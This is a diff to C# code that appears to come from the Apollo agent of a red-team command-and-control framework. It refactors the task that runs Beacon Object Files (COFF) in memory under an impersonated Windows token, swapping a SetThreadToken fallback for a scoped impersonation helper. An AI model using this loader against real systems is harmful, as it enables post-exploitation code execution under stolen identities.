@@ -1,4 +1,4 @@
-﻿#define COMMAND_NAME_UPPER
+#define COMMAND_NAME_UPPER
 
 #if DEBUG
 #define EXECUTE_COFF
@@ -52,14 +52,6 @@ namespace Tasks
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate IntPtr BeaconGetOutputDataDelegate([In, Out] ref int outsize);
-        // Add imported SetThreadToken API for thread token manipulation
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool SetThreadToken(
-            ref IntPtr ThreadHandle,
-            IntPtr Token);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetCurrentThread();
 
         private static RunCOFFDelegate? _RunCOFF;
         private static UnhexlifyDelegate? _Unhexlify;
@@ -1017,113 +1009,19 @@ namespace Tasks
             try
             {
                 DebugHelp.DebugWriteLine($"Starting COFF execution in thread {Thread.CurrentThread.ManagedThreadId}");
-                WindowsImpersonationContext tokenApplied;
                 if (!agent.GetIdentityManager().IsOriginalIdentity())
                 {
-                    DebugHelp.DebugWriteLine("Applying impersonation token to COFF execution thread");
-                    try
+                    WindowsIdentity impersonationIdentity = agent.GetIdentityManager().GetCurrentImpersonationIdentity();
+                    DebugHelp.DebugWriteLine($"Applying impersonation identity {impersonationIdentity.Name} to COFF execution thread");
+                    ApolloInterop.Classes.Impersonation.ImpersonationScope.Run(impersonationIdentity, () =>
                     {
-                        // Impersonate the current identity in this new thread
-                        tokenApplied = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate();
-                        DebugHelp.DebugWriteLine($"Successfully applied token for {agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name} to COFF thread");
-                        // Debug information about the current token
-                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
-                        DebugHelp.DebugWriteLine($"Thread identity after impersonation attempt: {currentThreadIdentity.Name}");
-                        //DebugHelp.DebugWriteLine($"Thread token type: {currentThreadIdentity.Token.ToInt64():X}");
-                        //DebugHelp.DebugWriteLine($"Is authenticated: {currentThreadIdentity.IsAuthenticated}");
-                        //DebugHelp.DebugWriteLine($"Authentication type: {currentThreadIdentity.AuthenticationType}");
-
-                        // List of groups/claims
-                        //DebugHelp.DebugWriteLine("Token groups/claims:");
-                        //foreach (var claim in currentThreadIdentity.Claims)
-                        //{
-                        //    DebugHelp.DebugWriteLine($"  - {claim.Type}: {claim.Value}");
-                        //}
-
-                        // Compare with expected identity
-                        string expectedName = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name;
-                        DebugHelp.DebugWriteLine($"Expected identity: {expectedName}");
-                        DebugHelp.DebugWriteLine($"Identity match: {expectedName == currentThreadIdentity.Name}");
-
-                    }
-                    catch (Exception ex)
-                    {
-                        DebugHelp.DebugWriteLine($"Error applying token to thread: {ex.Message}");
-                        // Fallback to using SetThreadToken API directly
-                        IntPtr threadHandle = GetCurrentThread();
-                        IntPtr tokenHandle = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Token;
-
-                        bool result = SetThreadToken(ref threadHandle, tokenHandle);
-                        if (result)
-                        {
-                            DebugHelp.DebugWriteLine("Successfully applied token using SetThreadToken API");
-                            // Verify identity after SetThreadToken
-                            WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
-                            DebugHelp.DebugWriteLine($"Thread identity after SetThreadToken: {currentThreadIdentity.Name}");
-                        }
-                        else
-                        {
-                            int error = Marshal.GetLastWin32Error();
-                            DebugHelp.DebugWriteLine($"SetThreadToken failed with error: {error}");
-                        }
-                    }
+                        ExecuteRunCoff(executionState);
+                    });
                 }
                 else
                 {
                     DebugHelp.DebugWriteLine("Using original identity for COFF execution");
-                    try
-                    {
-                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
-                        DebugHelp.DebugWriteLine($"Thread identity (original): {currentThreadIdentity.Name}");
-                    }
-                    catch (Exception ex)
-                    {
-                        DebugHelp.DebugWriteLine($"Error getting current identity: {ex.Message}");
-                    }
-                }
-
-
-                // Execute the COFF
-                executionState.Status = _RunCOFF(
-                    executionState.FunctionName,
-                    executionState.CoffData,
-                    executionState.FileSize,
-                    executionState.ArgumentData,
-                    executionState.ArgumentSize);
-
-                DebugHelp.DebugWriteLine($"COFF execution completed with status: {executionState.Status}");
-
-                // Get output data if execution was successful
-                if (executionState.Status == 0)
-                {
-                    int outdataSize = 0;
-                    IntPtr outdata = _BeaconGetOutputData(ref outdataSize);
-
-                    if (outdata != IntPtr.Zero && outdataSize > 0)
-                    {
-                        byte[] outDataBytes = new byte[outdataSize];
-                        Marshal.Copy(outdata, outDataBytes, 0, outdataSize);
-                        executionState.Output = Encoding.Default.GetString(outDataBytes);
-                        DebugHelp.DebugWriteLine($"Retrieved {outdataSize} bytes of output data");
-                    }
-                    else
-                    {
-                        executionState.Output = "No Output";
-                        DebugHelp.DebugWriteLine("No output data was returned from COFF execution");
-                    }
-                }
-                else
-                {
-                    DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
-                }
-                try
-                {
-                    DebugHelp.DebugWriteLine("Reverting impersonation in COFF thread");
-                    WindowsIdentity.Impersonate(IntPtr.Zero);
-                }
-                catch (Exception ex)
-                {
-                    DebugHelp.DebugWriteLine($"Error reverting impersonation: {ex.Message}");
+                    ExecuteRunCoff(executionState);
                 }
 
             }
@@ -1138,6 +1036,40 @@ namespace Tasks
                 // Signal that execution is complete
                 DebugHelp.DebugWriteLine("Signaling COFF execution completion");
                 executionState.CompletionEvent.Set();
+            }
+        }
+        private static void ExecuteRunCoff(COFFExecutionState executionState)
+        {
+            executionState.Status = _RunCOFF(
+                executionState.FunctionName,
+                executionState.CoffData,
+                executionState.FileSize,
+                executionState.ArgumentData,
+                executionState.ArgumentSize);
+
+            DebugHelp.DebugWriteLine($"COFF execution completed with status: {executionState.Status}");
+
+            if (executionState.Status == 0)
+            {
+                int outdataSize = 0;
+                IntPtr outdata = _BeaconGetOutputData(ref outdataSize);
+
+                if (outdata != IntPtr.Zero && outdataSize > 0)
+                {
+                    byte[] outDataBytes = new byte[outdataSize];
+                    Marshal.Copy(outdata, outDataBytes, 0, outdataSize);
+                    executionState.Output = Encoding.UTF8.GetString(outDataBytes);
+                    DebugHelp.DebugWriteLine($"Retrieved {outdataSize} bytes of output data");
+                }
+                else
+                {
+                    executionState.Output = "No Output";
+                    DebugHelp.DebugWriteLine("No output data was returned from COFF execution");
+                }
+            }
+            else
+            {
+                DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
             }
         }
         public override void Start()
